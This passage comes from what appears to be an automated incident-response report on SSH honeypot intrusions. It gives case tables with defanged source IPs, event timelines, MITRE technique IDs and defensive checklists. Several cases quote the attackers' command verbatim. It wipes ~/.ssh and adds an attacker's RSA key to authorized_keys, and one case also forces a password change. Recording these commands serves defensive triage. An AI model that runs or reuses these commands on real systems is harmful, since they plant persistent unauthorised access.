| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:34:32` | `cowrie.session.connect` |
| `2026-10-19 02:34:32` | `cowrie.login.success` |
| `2026-10-19 02:34:33` | `cowrie.session.params` |
| `2026-10-19 02:34:33` | `cowrie.command.input` |
| `2026-10-19 02:34:48` | `cowrie.log.closed` |
| `2026-10-19 02:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.25[.]218` to AbuseIPDB if not already reported
- [ ] Block `207.175.25[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db37219dc836

| Field | Detail |
|---|---|
| **Source IP** | `85.240.193[.]104` |
| **First Seen** | 2026-10-19 02:39 |
| **Last Seen** | 2026-10-19 02:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:39:06` | `cowrie.session.connect` |
| `2026-10-19 02:39:06` | `cowrie.client.version` |
| `2026-10-19 02:39:06` | `cowrie.client.kex` |
| `2026-10-19 02:39:07` | `cowrie.login.success` |
| `2026-10-19 02:39:08` | `cowrie.session.params` |
| `2026-10-19 02:39:08` | `cowrie.command.input` |
| `2026-10-19 02:39:08` | `cowrie.command.failed` |
| `2026-10-19 02:39:08` | `cowrie.log.closed` |
| `2026-10-19 02:39:09` | `cowrie.session.params` |
| `2026-10-19 02:39:09` | `cowrie.command.input` |
| `2026-10-19 02:39:09` | `cowrie.session.file_download` |
| `2026-10-19 02:39:09` | `cowrie.log.closed` |
| `2026-10-19 02:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.240.193[.]104` to AbuseIPDB if not already reported
- [ ] Block `85.240.193[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d111e2c919

| Field | Detail |
|---|---|
| **Source IP** | `85.240.193[.]104` |
| **First Seen** | 2026-10-19 02:39 |
| **Last Seen** | 2026-10-19 02:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:39:09` | `cowrie.session.connect` |
| `2026-10-19 02:39:09` | `cowrie.client.version` |
| `2026-10-19 02:39:09` | `cowrie.client.kex` |
| `2026-10-19 02:39:10` | `cowrie.login.success` |
| `2026-10-19 02:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.240.193[.]104` to AbuseIPDB if not already reported
- [ ] Block `85.240.193[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9afc610e182

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-10-19 02:39 |
| **Last Seen** | 2026-10-19 02:40 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "changeme\nwXrBl7anegjM\nwXrBl7anegjM"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:39:39` | `cowrie.session.connect` |
| `2026-10-19 02:39:40` | `cowrie.client.version` |
| `2026-10-19 02:39:40` | `cowrie.client.kex` |
| `2026-10-19 02:39:41` | `cowrie.login.success` |
| `2026-10-19 02:39:42` | `cowrie.session.params` |
| `2026-10-19 02:39:42` | `cowrie.command.input` |
| `2026-10-19 02:39:42` | `cowrie.command.failed` |
| `2026-10-19 02:39:42` | `cowrie.log.closed` |
| `2026-10-19 02:39:43` | `cowrie.session.params` |
| `2026-10-19 02:39:43` | `cowrie.command.input` |
| `2026-10-19 02:39:43` | `cowrie.session.file_download` |
| `2026-10-19 02:39:43` | `cowrie.log.closed` |
| `2026-10-19 02:40:00` | `cowrie.session.params` |
| `2026-10-19 02:40:00` | `cowrie.command.input` |
| `2026-10-19 02:40:00` | `cowrie.log.closed` |
| … | _49 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f7ed183541e

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-10-19 02:40 |
| **Last Seen** | 2026-10-19 02:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:40:31` | `cowrie.session.connect` |
| `2026-10-19 02:40:31` | `cowrie.client.version` |
| `2026-10-19 02:40:31` | `cowrie.client.kex` |
| `2026-10-19 02:40:32` | `cowrie.login.success` |
| `2026-10-19 02:40:33` | `cowrie.session.params` |
| `2026-10-19 02:40:33` | `cowrie.command.input` |
| `2026-10-19 02:40:33` | `cowrie.command.failed` |
| `2026-10-19 02:40:33` | `cowrie.log.closed` |
| `2026-10-19 02:40:34` | `cowrie.session.params` |
| `2026-10-19 02:40:34` | `cowrie.command.input` |
| `2026-10-19 02:40:34` | `cowrie.session.file_download` |
| `2026-10-19 02:40:34` | `cowrie.log.closed` |
| `2026-10-19 02:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61d54db2ddab

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-10-19 02:40 |
| **Last Seen** | 2026-10-19 02:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:40:35` | `cowrie.session.connect` |
| `2026-10-19 02:40:35` | `cowrie.client.version` |
| `2026-10-19 02:40:35` | `cowrie.client.kex` |
| `2026-10-19 02:40:36` | `cowrie.login.success` |
| `2026-10-19 02:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6074c22d6d4c

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-10-19 02:45 |
| **Last Seen** | 2026-10-19 02:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:45:32` | `cowrie.session.connect` |
| `2026-10-19 02:45:32` | `cowrie.client.version` |
| `2026-10-19 02:45:32` | `cowrie.client.kex` |
| `2026-10-19 02:45:32` | `cowrie.login.success` |
| `2026-10-19 02:45:33` | `cowrie.session.params` |
| `2026-10-19 02:45:33` | `cowrie.command.input` |
| `2026-10-19 02:45:33` | `cowrie.command.failed` |
| `2026-10-19 02:45:33` | `cowrie.log.closed` |
| `2026-10-19 02:45:34` | `cowrie.session.params` |
| `2026-10-19 02:45:34` | `cowrie.command.input` |
| `2026-10-19 02:45:34` | `cowrie.session.file_download` |
| `2026-10-19 02:45:34` | `cowrie.log.closed` |
| `2026-10-19 02:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc684fdf6cbc

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-10-19 02:45 |
| **Last Seen** | 2026-10-19 02:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:45:34` | `cowrie.session.connect` |
| `2026-10-19 02:45:34` | `cowrie.client.version` |
| `2026-10-19 02:45:34` | `cowrie.client.kex` |
| `2026-10-19 02:45:35` | `cowrie.login.success` |
| `2026-10-19 02:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a991bf003924

| Field | Detail |
|---|---|
| **Source IP** | `185.227.152[.]135` |
| **First Seen** | 2026-10-19 02:48 |
| **Last Seen** | 2026-10-19 02:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:48:31` | `cowrie.session.connect` |
| `2026-10-19 02:48:31` | `cowrie.client.version` |
| `2026-10-19 02:48:31` | `cowrie.client.kex` |
| `2026-10-19 02:48:32` | `cowrie.login.success` |
| `2026-10-19 02:48:33` | `cowrie.session.params` |
| `2026-10-19 02:48:33` | `cowrie.command.input` |
| `2026-10-19 02:48:33` | `cowrie.command.failed` |
| `2026-10-19 02:48:34` | `cowrie.log.closed` |
| `2026-10-19 02:48:34` | `cowrie.session.params` |
| `2026-10-19 02:48:34` | `cowrie.command.input` |
| `2026-10-19 02:48:35` | `cowrie.session.file_download` |
| `2026-10-19 02:48:35` | `cowrie.log.closed` |
| `2026-10-19 02:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.227.152[.]135` to AbuseIPDB if not already reported
- [ ] Block `185.227.152[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-455e22e8c6b3

| Field | Detail |
|---|---|
| **Source IP** | `185.227.152[.]135` |
| **First Seen** | 2026-10-19 02:48 |
| **Last Seen** | 2026-10-19 02:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:48:35` | `cowrie.session.connect` |
| `2026-10-19 02:48:35` | `cowrie.client.version` |
| `2026-10-19 02:48:35` | `cowrie.client.kex` |
| `2026-10-19 02:48:36` | `cowrie.login.success` |
| `2026-10-19 02:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.227.152[.]135` to AbuseIPDB if not already reported
- [ ] Block `185.227.152[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747db65eba4a

| Field | Detail |
|---|---|
| **Source IP** | `45.114.93[.]31` |
| **First Seen** | 2026-10-19 02:53 |
| **Last Seen** | 2026-10-19 02:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:53:03` | `cowrie.session.connect` |
| `2026-10-19 02:53:03` | `cowrie.client.version` |
| `2026-10-19 02:53:04` | `cowrie.client.kex` |
| `2026-10-19 02:53:05` | `cowrie.login.success` |
| `2026-10-19 02:53:06` | `cowrie.session.params` |
| `2026-10-19 02:53:06` | `cowrie.command.input` |
| `2026-10-19 02:53:06` | `cowrie.command.failed` |
| `2026-10-19 02:53:06` | `cowrie.log.closed` |
| `2026-10-19 02:53:07` | `cowrie.session.params` |
| `2026-10-19 02:53:07` | `cowrie.command.input` |
| `2026-10-19 02:53:07` | `cowrie.session.file_download` |
| `2026-10-19 02:53:07` | `cowrie.log.closed` |
| `2026-10-19 02:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.114.93[.]31` to AbuseIPDB if not already reported
- [ ] Block `45.114.93[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (197) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-25e5fcb6e1cc | HIGH | `45.114.93[.]31` | 2026-10-19 02:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-05e3b7abe3dd | HIGH | `119.209.12[.]20` | 2026-10-19 02:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9415add408d5 | HIGH | `119.209.12[.]20` | 2026-10-19 02:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ed055ad4f7a | HIGH | `5.253.38[.]188` | 2026-10-19 02:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e4d7e76bcbf6 | HIGH | `5.253.38[.]188` | 2026-10-19 02:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3c930d780f9c | HIGH | `147.90.234[.]19` | 2026-10-19 02:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e077ecb18481 | HIGH | `147.90.234[.]19` | 2026-10-19 02:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bbd4707cf26f | HIGH | `80.94.92[.]234` | 2026-10-19 03:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-aace15592c5f | HIGH | `156.232.13[.]246` | 2026-10-19 03:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-33f1647fab24 | HIGH | `156.232.13[.]246` | 2026-10-19 03:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-756a4deb8837 | HIGH | `69.49.246[.]176` | 2026-10-19 03:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-879a759e413a | HIGH | `69.49.246[.]176` | 2026-10-19 03:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-60f4caf32366 | HIGH | `45.78.230[.]231` | 2026-10-19 03:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4e2ae67fa9ba | HIGH | `45.78.230[.]231` | 2026-10-19 03:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c7418ead23a2 | HIGH | `34.78.119[.]163` | 2026-10-19 03:04 | Y | 2 | 0 | `T1078` |
| IR-acfd6dc0047a | HIGH | `34.78.119[.]163` | 2026-10-19 03:04 | Y | 1 | 0 | `T1078` |
| IR-8069b1f277e0 | HIGH | `34.78.119[.]163` | 2026-10-19 03:04 | Y | 0 | 0 | `T1078` |
| IR-1adfee9838ee | HIGH | `129.121.142[.]45` | 2026-10-19 03:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a6a7e4d976c2 | HIGH | `129.121.142[.]45` | 2026-10-19 03:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a7fb9c03d370 | HIGH | `115.190.62[.]199` | 2026-10-19 03:12 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2a6cf5ad047f | HIGH | `176.53.159[.]196` | 2026-10-19 03:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ec28b88944a | HIGH | `207.175.171[.]10` | 2026-10-19 03:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cb09d85045cc | HIGH | `195.178.110[.]218` | 2026-10-19 03:55 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1bae9df9ccc5 | HIGH | `195.178.110[.]218` | 2026-10-19 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-197ce46b27d4 | HIGH | `81.211.72[.]167` | 2026-10-19 04:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3423efd06061 | HIGH | `81.211.72[.]167` | 2026-10-19 04:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-39f74c25d663 | HIGH | `2.57.122[.]209` | 2026-10-19 04:13 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-2d1cf9e3f078 | HIGH | `202.152.201[.]166` | 2026-10-19 04:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5b175849ea5e | HIGH | `202.152.201[.]166` | 2026-10-19 04:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-29542f35c09a | HIGH | `186.158.183[.]66` | 2026-10-19 04:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f479bcce575f | HIGH | `147.50.231[.]135` | 2026-10-19 04:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-89360bd85169 | HIGH | `186.158.183[.]66` | 2026-10-19 04:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b0935b2db9aa | HIGH | `147.50.231[.]135` | 2026-10-19 04:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2edb09ece678 | HIGH | `176.53.159[.]196` | 2026-10-19 04:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7acb63ddc566 | HIGH | `193.112.192[.]91` | 2026-10-19 04:37 | Y | 1 | 0 | `T1078 · T1592` |
| IR-29c794aa5f4d | HIGH | `193.112.192[.]91` | 2026-10-19 04:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f6cb00dc0790 | HIGH | `172.213.8[.]197` | 2026-10-19 04:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4a270dba4586 | HIGH | `172.213.8[.]197` | 2026-10-19 04:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-00a537273958 | HIGH | `128.1.42[.]111` | 2026-10-19 05:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f410c19ed05e | HIGH | `128.1.42[.]111` | 2026-10-19 05:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2847265f67be | HIGH | `129.121.136[.]201` | 2026-10-19 05:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-de5a5490d341 | HIGH | `129.121.136[.]201` | 2026-10-19 05:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8cbb3fcbce2f | HIGH | `77.239.124[.]162` | 2026-10-19 05:07 | Y | 4 | 0 | `T1078 · T1083` |
| IR-b2bf89f0550f | HIGH | `109.160.32[.]163` | 2026-10-19 05:13 | Y | 1 | 0 | `T1078 · T1592` |
| IR-88a8fbb24cf7 | HIGH | `130.12.180[.]32` | 2026-10-19 05:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64acfd6491b4 | HIGH | `130.12.180[.]32` | 2026-10-19 05:19 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ad57e312796a | HIGH | `109.160.32[.]157` | 2026-10-19 05:33 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c1281467f34b | HIGH | `114.224.83[.]112` | 2026-10-19 05:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-40c16e60f91b | HIGH | `196.189.236[.]67` | 2026-10-19 05:50 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-e6dd5b85e1ed | HIGH | `47.236.199[.]209` | 2026-10-19 05:53 | Y | 2 | 0 | `T1078 · T1105` |
| IR-2c2385bdaa27 | HIGH | `109.160.32[.]157` | 2026-10-19 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d449e6a9760f | HIGH | `109.160.32[.]163` | 2026-10-19 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3cae70058e9c | HIGH | `195.178.110[.]218` | 2026-10-19 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-23e26b74a607 | HIGH | `180.73.203[.]205` | 2026-10-19 06:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ee351426ce5f | HIGH | `180.73.203[.]205` | 2026-10-19 06:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-01abf47208a8 | HIGH | `46.147.195[.]11` | 2026-10-19 06:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-64141ff40564 | HIGH | `46.147.195[.]11` | 2026-10-19 06:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cdaeeacd7e3d | HIGH | `72.17.34[.]38` | 2026-10-19 06:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cf4f6bdb28d0 | HIGH | `72.17.34[.]38` | 2026-10-19 06:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0e4a7d2c97f2 | HIGH | `109.160.32[.]157` | 2026-10-19 06:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-167f808555d4 | HIGH | `109.160.32[.]169` | 2026-10-19 06:19 | Y | 1 | 0 | `T1078 · T1592` |
| IR-412f32d7e981 | HIGH | `182.237.13[.]208` | 2026-10-19 06:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c959d46de798 | HIGH | `182.237.13[.]208` | 2026-10-19 06:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6e9be3757d71 | HIGH | `197.199.224[.]52` | 2026-10-19 06:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a6525f82a480 | HIGH | `197.199.224[.]52` | 2026-10-19 06:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-100fa59049c0 | HIGH | `39.170.37[.]133` | 2026-10-19 06:34 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-e80a8e9ddd8d | HIGH | `39.170.37[.]133` | 2026-10-19 06:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9ef5d1267bff | HIGH | `176.53.159[.]196` | 2026-10-19 06:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6b8bdcffc7b6 | HIGH | `144.22.238[.]238` | 2026-10-19 07:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cd1106b31194 | HIGH | `2.57.122[.]209` | 2026-10-19 07:16 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
